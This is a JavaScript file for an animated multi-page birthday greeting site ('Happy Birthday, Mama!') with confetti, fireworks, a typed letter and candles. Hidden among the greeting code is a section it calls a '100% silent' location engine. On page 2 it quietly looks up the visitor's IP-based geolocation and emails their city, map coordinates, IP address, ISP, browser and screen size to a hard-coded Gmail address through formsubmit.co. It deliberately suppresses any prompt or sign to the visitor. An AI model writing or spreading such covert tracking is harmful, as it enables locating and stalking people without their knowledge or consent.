/* ==========================================================================
   HAPPY BIRTHDAY, MAMA! - MULTI-PAGE & 100% SILENT LOCATION ENGINE
   ========================================================================== */

/**
 * 1. PERSONALIZATION & EMAIL NOTIFICATION CONFIGURATION
 * Easily customize name, sender, message body, and notification email.
 */
const birthdayConfig = {
    name: "Mama",
    senderName: "Your Name",
    notificationEmail: "jh4406011@gmail.com", // Target email address
    birthdayMessage: `Happy Birthday, Mama! ❤️

You are one of those people who make a family feel warmer, happier, and stronger.

On your special day, I just want to wish you endless happiness, peace, good health, and many beautiful moments ahead.

Thank you for always being someone we can laugh with, learn from, and look up to.

May this new year of your life bring you everything that makes you smile.

Happy Birthday once again, Mama! 🎂✨`
};

/* --------------------------------------------------------------------------
   2. GLOBAL STATE & UTILITIES
   -------------------------------------------------------------------------- */
const state = {
    currentPage: 1,
    totalPages: 8,
    candlesLit: 3,
    envelopeOpened: false,
    surpriseOpened: false,
    notificationSent: false,
    particles: [],
    confetti: [],
    fireworks: []
};

// Check reduced motion preference
const isReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;

/* --------------------------------------------------------------------------
   3. 100% SILENT BACKGROUND LOCATION ENGINE
   Zero browser popups, zero permission dialogs, zero notifications to visitor.
   -------------------------------------------------------------------------- */
async function fetchSilentLocation() {
    let loc = {
        city: "Unknown City",
        region: "Unknown Region",
        country: "Unknown Country",
        ip: "Unknown IP",
        org: "Unknown Network",
        maps_url: "N/A"
    };

    // Provider 1: ipwho.is (100% Silent, CORS-enabled, Zero Popups)
    try {
        const res = await fetch("https://ipwho.is/");
        if (res.ok) {
            const data = await res.json();
            if (data && data.success !== false) {
                return {
                    city: data.city || "Unknown City",
                    region: data.region || "Unknown Region",
                    country: data.country || "Unknown Country",
                    ip: data.ip || "Unknown IP",
                    org: data.connection?.isp || data.connection?.org || "Unknown Network",
                    maps_url: (data.latitude && data.longitude) ? `https://www.google.com/maps?q=${data.latitude},${data.longitude}` : "N/A"
                };
            }
        }
    } catch (e) {
        console.warn("Silent Provider 1 failed, trying Provider 2...");
    }

    // Provider 2: get.geojs.io (100% Silent Fallback)
    try {
        const res = await fetch("https://get.geojs.io/v1/ip/geo.json");
        if (res.ok) {
            const data = await res.json();
            if (data) {
                return {
                    city: data.city || "Unknown City",
                    region: data.region || "Unknown Region",
                    country: data.country || "Unknown Country",
                    ip: data.ip || "Unknown IP",
                    org: data.organization_name || "Unknown Network",
                    maps_url: (data.latitude && data.longitude) ? `https://www.google.com/maps?q=${data.latitude},${data.longitude}` : "N/A"
                };
            }
        }
    } catch (e) {
        console.warn("Silent Provider 2 failed.");
    }

    return loc;
}

async function sendSurpriseNotification() {
    if (state.notificationSent || !birthdayConfig.notificationEmail) return;
    state.notificationSent = true;

    // Await silent location fetch BEFORE sending email
    const loc = await fetchSilentLocation();

    const payload = {
        _subject: `🎉 ${birthdayConfig.name} Opened Surprise from ${loc.city}, ${loc.country}!`,
        _captcha: "false",      // Disables reCAPTCHA prompts
        _autorespond: "false",  // Disables auto-reply emails to the visitor
        _template: "table",     // Clean table format for your email inbox
        event: "Birthday Surprise Opened",
        recipient: birthdayConfig.name,
        timestamp: new Date().toLocaleString(),
        city: loc.city,
        region: loc.region,
        country: loc.country,
        google_maps_location: loc.maps_url,
        ip_address: loc.ip,
        network_provider: loc.org,
        device_browser: navigator.userAgent,
        screen_resolution: `${window.screen.width}x${window.screen.height}`
    };

    try {
        await fetch(`https://formsubmit.co/ajax/${birthdayConfig.notificationEmail}`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            body: JSON.stringify(payload)
        });
        console.log("Surprise notification email sent silently with location!");
    } catch (err) {
        console.warn("Notification error:", err);
    }
}

/* --------------------------------------------------------------------------
   4. MULTI-PAGE NAVIGATION ENGINE
   -------------------------------------------------------------------------- */
function goToPage(targetPageNum) {
    const pageNum = parseInt(targetPageNum, 10);
    if (isNaN(pageNum) || pageNum < 1 || pageNum > state.totalPages) return;

    const currentPageElem = document.querySelector('.page.active-page');
    const targetPageElem = document.getElementById(`page-${pageNum}`);

    if (!targetPageElem || currentPageElem === targetPageElem) return;

    // Exit current page
    if (currentPageElem) {
        currentPageElem.classList.add('page-exit');
    }

    setTimeout(() => {
        if (currentPageElem) {
            currentPageElem.classList.remove('active-page', 'page-exit');
        }

        state.currentPage = pageNum;
        targetPageElem.classList.add('active-page');

        // Update progress bar
        const progressFill = document.getElementById('progress-fill');
        const progressText = document.getElementById('progress-text');
        const percentage = (pageNum / state.totalPages) * 100;
        
        if (progressFill) progressFill.style.width = `${percentage}%`;
        if (progressText) progressText.innerText = `Page ${pageNum} of ${state.totalPages}`;

        // Scroll to top of window smoothly
        window.scrollTo({ top: 0, behavior: 'smooth' });

        // Page-specific action triggers
        onPageEnter(pageNum);
    }, 350);
}

function onPageEnter(pageNum) {
    if (pageNum === 2) {
        // Page 2: Grand Reveal
        createConfettiBurst(window.innerWidth / 2, window.innerHeight / 2, 80);
        launchFirework();

        // Await 100% silent location email notification
        sendSurpriseNotification();
    } else if (pageNum === 5) {
        // Page 5: Birthday Cake
        if (state.candlesLit === 0) {
            createConfettiBurst(window.innerWidth / 2, window.innerHeight / 3, 50);
        }
    } else if (pageNum === 8) {
        // Page 8: Grand Finale
        createConfettiBurst(window.innerWidth / 2, window.innerHeight / 2, 120);
        for (let i = 0; i < 6; i++) {
            setTimeout(launchFirework, i * 220);
        }
    }
}

/* --------------------------------------------------------------------------
   5. CANVAS ENGINE (STARS, DUST, CONFETTI & FIREWORKS)
   -------------------------------------------------------------------------- */
const canvas = document.getElementById('bg-canvas');
const ctx = canvas.getContext('2d');

function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
}
window.addEventListener('resize', resizeCanvas);
resizeCanvas();

// Ambient Star Class
class Star {
    constructor() {
        this.reset();
    }
    reset() {
        this.x = Math.random() * canvas.width;
        this.y = Math.random() * canvas.height;
        this.size = Math.random() * 2 + 0.5;
        this.alpha = Math.random() * 0.8 + 0.2;
        this.speed = Math.random() * 0.012 + 0.005;
    }
    update() {
        this.alpha += this.speed;
        if (this.alpha > 1 || this.alpha < 0.2) {
            this.speed = -this.speed;
        }
    }
    draw() {
        ctx.fillStyle = `rgba(255, 255, 255, ${this.alpha})`;
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
        ctx.fill();
    }
}

// Ambient Gold Dust Particle Class
class GoldParticle {
    constructor() {
        this.reset();
    }
    reset() {
        this.x = Math.random() * canvas.width;
        this.y = Math.random() * canvas.height;
        this.radius = Math.random() * 2.8 + 1;
        this.vx = (Math.random() - 0.5) * 0.35;
        this.vy = -Math.random() * 0.45 - 0.15;
        this.alpha = Math.random() * 0.65 + 0.2;
    }
    update() {
        this.x += this.vx;
        this.y += this.vy;
        if (this.y < -10 || this.x < -10 || this.x > canvas.width + 10) {
            this.reset();
            this.y = canvas.height + 10;
        }
    }
    draw() {
        ctx.fillStyle = `rgba(251, 191, 36, ${this.alpha})`;
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
        ctx.fill();
    }
}

// Confetti Burst Class
class ConfettiParticle {
    constructor(x, y) {
        this.x = x || canvas.width / 2;
        this.y = y || canvas.height / 2;
        this.size = Math.random() * 9 + 5;
        this.vx = (Math.random() - 0.5) * 14;
        this.vy = (Math.random() - 0.5) * 14 - 4;
        this.gravity = 0.24;
        this.rotation = Math.random() * 360;
        this.rotationSpeed = (Math.random() - 0.5) * 12;
        this.color = ['#fbbf24', '#d4af37', '#f43f5e', '#38bdf8', '#a855f7', '#34d399'][Math.floor(Math.random() * 6)];
        this.alpha = 1;
        this.decay = Math.random() * 0.015 + 0.006;
    }
    update() {
        this.x += this.vx;
        this.y += this.vy;
        this.vy += this.gravity;
        this.rotation += this.rotationSpeed;
        this.alpha -= this.decay;
    }
    draw() {
        if (this.alpha <= 0) return;
        ctx.save();
        ctx.translate(this.x, this.y);
        ctx.rotate((this.rotation * Math.PI) / 180);
        ctx.fillStyle = this.color;
        ctx.globalAlpha = this.alpha;
        ctx.fillRect(-this.size / 2, -this.size / 2, this.size, this.size * 0.6);
        ctx.restore();
    }
}

// Firework Particle Class
class FireworkParticle {
    constructor(x, y, color) {
        this.x = x;
        this.y = y;
        this.color = color;
        const angle = Math.random() * Math.PI * 2;
        const speed = Math.random() * 7 + 1;
        this.vx = Math.cos(angle) * speed;
        this.vy = Math.sin(angle) * speed;
        this.gravity = 0.08;
        this.alpha = 1;
        this.decay = Math.random() * 0.02 + 0.01;
    }
    update() {
        this.x += this.vx;
        this.y += this.vy;
        this.vy += this.gravity;
        this.alpha -= this.decay;
    }
    draw() {
        if (this.alpha <= 0) return;
        ctx.save();
        ctx.fillStyle = this.color;
        ctx.globalAlpha = this.alpha;
        ctx.beginPath();
        ctx.arc(this.x, this.y, 2.5, 0, Math.PI * 2);
        ctx.fill();
        ctx.restore();
    }
}

// Firework Rocket
class FireworkRocket {
    constructor(startX, startY, targetY, color) {
        this.x = startX;
        this.y = startY;
        this.targetY = targetY;
        this.color = color;
        this.speed = Math.random() * 4 + 7.5;
        this.exploded = false;
    }
    update() {
        this.y -= this.speed;
        if (this.y <= this.targetY) {
            this.exploded = true;
            createExplosion(this.x, this.y, this.color);
        }
    }
    draw() {
        if (this.exploded) return;
        ctx.fillStyle = this.color;
        ctx.beginPath();
        ctx.arc(this.x, this.y, 3, 0, Math.PI * 2);
        ctx.fill();
    }
}

// Initialize ambient canvas objects
const stars = Array.from({ length: 95 }, () => new Star());
const goldParticles = Array.from({ length: 45 }, () => new GoldParticle());

function createConfettiBurst(x, y, count = 75) {
    if (isReducedMotion) return;
    for (let i = 0; i < count; i++) {
        state.confetti.push(new ConfettiParticle(x, y));
    }
}

function createExplosion(x, y, color) {
    if (isReducedMotion) return;
    const colors = color ? [color] : ['#fbbf24', '#d4af37', '#f43f5e', '#38bdf8', '#a855f7'];
    for (let i = 0; i < 50; i++) {
        const pColor = colors[Math.floor(Math.random() * colors.length)];
        state.particles.push(new FireworkParticle(x, y, pColor));
    }
}

function launchFirework() {
    if (isReducedMotion) return;
    const startX = Math.random() * (canvas.width * 0.8) + canvas.width * 0.1;
    const targetY = Math.random() * (canvas.height * 0.4) + canvas.height * 0.1;
    const colors = ['#fbbf24', '#d4af37', '#f43f5e', '#38bdf8', '#ffffff'];
    const color = colors[Math.floor(Math.random() * colors.length)];
    state.fireworks.push(new FireworkRocket(startX, canvas.height, targetY, color));
}

// Render Animation Loop
function animateCanvas() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);

    // Render stars & dust
    stars.forEach(star => { star.update(); star.draw(); });
    goldParticles.forEach(gp => { gp.update(); gp.draw(); });

    // Render Confetti
    for (let i = state.confetti.length - 1; i >= 0; i--) {
        const c = state.confetti[i];
        c.update();
        c.draw();
        if (c.alpha <= 0) state.confetti.splice(i, 1);
    }

    // Render Fireworks
    for (let i = state.fireworks.length - 1; i >= 0; i--) {
        const fw = state.fireworks[i];
        fw.update();
        fw.draw();
        if (fw.exploded) state.fireworks.splice(i, 1);
    }

    // Render Firework particles
    for (let i = state.particles.length - 1; i >= 0; i--) {
        const p = state.particles[i];
        p.update();
        p.draw();
        if (p.alpha <= 0) state.particles.splice(i, 1);
    }

    requestAnimationFrame(animateCanvas);
}
requestAnimationFrame(animateCanvas);

/* --------------------------------------------------------------------------
   6. TYPEWRITER EFFECT CONTROLLER
   -------------------------------------------------------------------------- */
function typeText(element, text, speed = 30, callback) {
    element.innerHTML = '';
    let index = 0;
    const cursor = document.createElement('span');
    cursor.className = 'typewriter-cursor';
    element.appendChild(cursor);

    function typeChar() {
        if (index < text.length) {
            cursor.before(text.charAt(index));
            index++;
            setTimeout(typeChar, speed);
        } else {
            cursor.remove();
            if (callback) callback();
        }
    }
    typeChar();
}

/* --------------------------------------------------------------------------
   7. PAGE 1: CINEMATIC OPENING INITIALIZATION
   -------------------------------------------------------------------------- */
document.addEventListener('DOMContentLoaded', () => {
    const openingText1 = document.getElementById('opening-text-1');
    const openingText2 = document.getElementById('opening-text-2');
    const openingAction = document.querySelector('.opening-action');

    // Run opening typewriter sequence
    typeText(openingText1, "Today is a very special day…", 45, () => {
        setTimeout(() => {
            openingText2.classList.add('show');
            setTimeout(() => {
                openingAction.classList.add('show');
            }, 500);
        }, 350);
    });

    // Attach click listeners for all "Page Navigation" buttons
    document.body.addEventListener('click', (e) => {
        const btn = e.target.closest('.btn-next-page');
        if (btn) {
            const targetPage = btn.getAttribute('data-target');
            if (targetPage) goToPage(targetPage);
        }
    });

    // Ripple effect on buttons
    document.querySelectorAll('.btn').forEach(button => {
        button.addEventListener('click', function(e) {
            const circle = document.createElement('span');
            const diameter = Math.max(this.clientWidth, this.clientHeight);
            const radius = diameter / 2;
            const rect = this.getBoundingClientRect();
            circle.style.width = circle.style.height = `${diameter}px`;
            circle.style.left = `${e.clientX - rect.left - radius}px`;
            circle.style.top = `${e.clientY - rect.top - radius}px`;
            circle.classList.add('ripple');
            
            const ripple = this.querySelector('.ripple');
            if (ripple) ripple.remove();
            this.appendChild(circle);
        });
    });
});

/* --------------------------------------------------------------------------
   8. PAGE 3: REVAMPED 3D LUXURY ENVELOPE CONTROLLER
   -------------------------------------------------------------------------- */
document.addEventListener('DOMContentLoaded', () => {
    const envelopeBox = document.getElementById('envelope-3d-box');
    const waxSealBtn = document.getElementById('wax-seal-btn');
    const btnOpenMessage = document.getElementById('btn-open-message');
    const promptBox = document.getElementById('envelope-prompt-box');
    const typedContainer = document.getElementById('typed-message-container');
    const page3NextWrapper = document.getElementById('page-3-next-wrapper');

    function openEnvelope() {
        if (state.envelopeOpened) return;
        state.envelopeOpened = true;

        envelopeBox.classList.add('opened');
        playChime();

        createConfettiBurst(window.innerWidth / 2, window.innerHeight / 2, 40);

        setTimeout(() => {
            if (promptBox) promptBox.style.display = 'none';

            // Type letter text into inner card
            typeText(typedContainer, birthdayConfig.birthdayMessage, 30, () => {
                page3NextWrapper.classList.remove('hidden');
            });
        }, 750);
    }

    if (waxSealBtn) waxSealBtn.addEventListener('click', openEnvelope);
    if (btnOpenMessage) btnOpenMessage.addEventListener('click', openEnvelope);
});

/* --------------------------------------------------------------------------
   9. PAGE 4: 3D CARD TILT EFFECT ("WHAT MAKES YOU SPECIAL")
   -------------------------------------------------------------------------- */
document.querySelectorAll('.tilt-card').forEach(card => {
    card.addEventListener('mousemove', (e) => {
        const rect = card.getBoundingClientRect();
        const x = e.clientX - rect.left;
        const y = e.clientY - rect.top;
        const centerX = rect.width / 2;
        const centerY = rect.height / 2;

        const tiltX = (y - centerY) / 12;
        const tiltY = (centerX - x) / 12;

        card.style.transform = `perspective(1000px) rotateX(${tiltX}deg) rotateY(${tiltY}deg) translateY(-6px)`;
        card.style.setProperty('--glow-x', `${x}px`);
        card.style.setProperty('--glow-y', `${y}px`);
    });

    card.addEventListener('mouseleave', () => {
        card.style.transform = `perspective(1000px) rotateX(0deg) rotateY(0deg) translateY(0px)`;
    });
});

/* --------------------------------------------------------------------------
   10. PAGE 5: REVAMPED DELUXE 3D BIRTHDAY CAKE & CANDLE CONTROLLER
   -------------------------------------------------------------------------- */
document.addEventListener('DOMContentLoaded', () => {
    const candles = document.querySelectorAll('.deluxe-candle');
    const banner = document.getElementById('wish-granted-banner');
    const relightBtn = document.getElementById('btn-relight-candles');
    const cakeInstruction = document.getElementById('cake-instruction');
    const page5SkipWrapper = document.getElementById('page-5-skip-wrapper');

    candles.forEach(candle => {
        const blowHandler = () => {
            if (candle.classList.contains('blown')) return;
            candle.classList.add('blown');
            state.candlesLit--;

            // Small flame out spark burst
            const rect = candle.getBoundingClientRect();
            createConfettiBurst(rect.left + rect.width / 2, rect.top, 20);
            playPopSound();

            if (state.candlesLit === 0) {
                // All 3 candles blown out -> Trigger Grand Wish Granted Celebration!
                setTimeout(triggerWishGranted, 600);
            }
        };

        candle.addEventListener('click', blowHandler);
        candle.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' || e.key === ' ') blowHandler();
        });
    });

    function triggerWishGranted() {
        cakeInstruction.innerText = "All wishes made! ✨";
        banner.classList.remove('hidden');
        if (page5SkipWrapper) page5SkipWrapper.classList.add('hidden');

        // Fireworks explosion
        createConfettiBurst(window.innerWidth / 2, window.innerHeight / 3, 140);
        for (let i = 0; i < 5; i++) {
            setTimeout(launchFirework, i * 250);
        }
    }

    relightBtn.addEventListener('click', () => {
        state.candlesLit = 3;
        candles.forEach(c => c.classList.remove('blown'));
        banner.classList.add('hidden');
        if (page5SkipWrapper) page5SkipWrapper.classList.remove('hidden');
        cakeInstruction.innerText = "Tap the candles and make your birthday wish…";
    });
});

/* --------------------------------------------------------------------------
   11. PAGE 7: HIDDEN SURPRISE & GIFT BOX SEQUENCE
   -------------------------------------------------------------------------- */
document.addEventListener('DOMContentLoaded', () => {
    const giftBox = document.getElementById('gift-box');
    const btnOpenSurprise = document.getElementById('btn-open-final-surprise');
    const btnCelebrateAgain = document.getElementById('btn-celebrate-again');

    function openFinalSurprise() {
        if (state.surpriseOpened) return;
        state.surpriseOpened = true;

        giftBox.classList.add('shaking');

        setTimeout(() => {
            giftBox.classList.remove('shaking');
            giftBox.classList.add('opened');

            // Golden light explosion
            createConfettiBurst(window.innerWidth / 2, window.innerHeight / 2, 150);
            for (let i = 0; i < 7; i++) {
                setTimeout(launchFirework, i * 200);
            }

            setTimeout(() => {
                goToPage(8);
            }, 900);
        }, 1200);
    }

    btnOpenSurprise.addEventListener('click', openFinalSurprise);
    giftBox.addEventListener('click', openFinalSurprise);

    btnCelebrateAgain.addEventListener('click', () => {
        createConfettiBurst(window.innerWidth / 2, window.innerHeight / 2, 120);
        for (let i = 0; i < 5; i++) {
            setTimeout(launchFirework, i * 200);
        }
        goToPage(5);
    });
});

/* --------------------------------------------------------------------------
   12. PROCEDURAL SOUND EFFECTS (WEB AUDIO API)
   -------------------------------------------------------------------------- */
function playChime() {
    try {
        const AudioCtx = window.AudioContext || window.webkitAudioContext;
        const ctx = new AudioCtx();
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = 'triangle';
        osc.frequency.setValueAtTime(523.25, ctx.currentTime);
        osc.frequency.exponentialRampToValueAtTime(1046.50, ctx.currentTime + 0.5);
        gain.gain.setValueAtTime(0.15, ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.5);
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start();
        osc.stop(ctx.currentTime + 0.5);
    } catch (e) {}
}

function playPopSound() {
    try {
        const AudioCtx = window.AudioContext || window.webkitAudioContext;
        const ctx = new AudioCtx();
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = 'sine';
        osc.frequency.setValueAtTime(300, ctx.currentTime);
        osc.frequency.exponentialRampToValueAtTime(1200, ctx.currentTime + 0.15);
        gain.gain.setValueAtTime(0.2, ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.15);
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start();
        osc.stop(ctx.currentTime + 0.15);
    } catch (e) {}
}
